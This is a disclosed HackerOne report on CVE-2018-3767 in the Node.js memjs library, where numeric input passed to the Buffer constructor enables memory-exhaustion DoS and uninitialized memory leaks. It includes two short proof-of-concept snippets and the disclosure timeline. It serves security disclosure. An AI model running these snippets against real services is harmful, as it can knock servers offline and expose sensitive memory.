---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
  - vuln/info-disclosure
  - vuln/dos
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2018-06-27
submitted: 2018-02-26T15:11:42.082Z
bounty_usd: null
votes: 11
cve: "CVE-2018-3767"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/319809"
title: "`memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage"
---
# `memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 11 | **Program:** Node.js third-party modules | **Disclosed:** 2018-06-27

- Report: [https://hackerone.com/reports/319809](https://hackerone.com/reports/319809)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2018-3767
- Submitted: 2018-02-26T15:11:42.082Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a Buffer allocation vulnerability in `memjs`.

In cases when the attacker is able to pass typed input (e.g. via JSON) to the storage, it allows to cause DoS (on all Node.js versions) and to store (and potentially later extract) chunks of uninitialized server memory containing sensitive data.

# Module

**module name:** `memjs`
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/memjs`

## Module Description

> MemJS is a pure Node.js client library for using memcache, in particular, the MemCachier service. It uses the binary protocol and support SASL authentication.

## Module Stats

186 downloads in the last day
2 903 downloads in the last week
12 037 downloads in the last month

~144 444 estimated downloads per year *(yay, a pretty number)*

# Vulnerability

## Vulnerability Description

`memjs` passes `value` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'value' parameter (e.g. JSON).

## Steps To Reproduce:

`memcached` should be up and running.

### DoS

```js
var client = require('memjs').Client.create()
function tick() {
  var value = 2e9;
  client.set('key', value, {expires: 600 }, () => {});
}
setInterval(tick, 200);
```

### Uninitialized memory exposed (when running on Node.js below 8.0)

```js
var client = require('memjs').Client.create()
var value = 100;
client.set('key', value, {expires: 600 }, () => {});
client.get('key', (err, val) => console.log(val));
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- memcached 1.5.5

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js < 8.x)

## Timeline

- **Report Filed**
- **Report Triaged**
- **2018-03-10** @lirantal: Hi @chalker ,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **2018-03-10** @lirantal: @chalker I do see the memory and CPU spikes but I also see a message in my console "MemJS SET: Value too large"
- **Report Severity Updated**
- **2018-03-10** @chalker: @lirantal Yes, this is what happens when `.set(… 2e9 …)` is invoked:
1. A large Buffer is allocated
2. memjs tries to set it asynchronously with a callback
3. set fails, the callback displays the error

Between 1 and 3 the Buffer still exists, so if multiple `.set` operations are performed sequentially, it is easy to exhaust all the available memory.
- **2018-03-10** @lirantal: yeah I saw the rise was just wondering if it had any effect.
let's wait for an update from Amit.
- **2018-04-24** @lirantal: @chalker looks like there's a newer version (1.2.0) and it's been already 2 months since we triaged.
How do you feel with disclosing this report?
- **External User Joined**
- **2018-05-11** @lirantal: @o-sl thank you for joining, can you review @chalker's report?
- **2018-05-20** @lirantal: @chalker looks like low activity on this report that's been idle for 3 months.
should we go ahead and disclose?
- **2018-06-15** @lirantal: @chalker another ping on this one
- **2018-06-26** @chalker: @lirantal This is applicable to 1.2.0, nothing looks to be changed in that aspect.
If the maintainers are unresponsive, I am fine with disclosing this.
- **Changed Scope**
- **2018-06-27** @lirantal: Will continue forward with public disclosure then
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
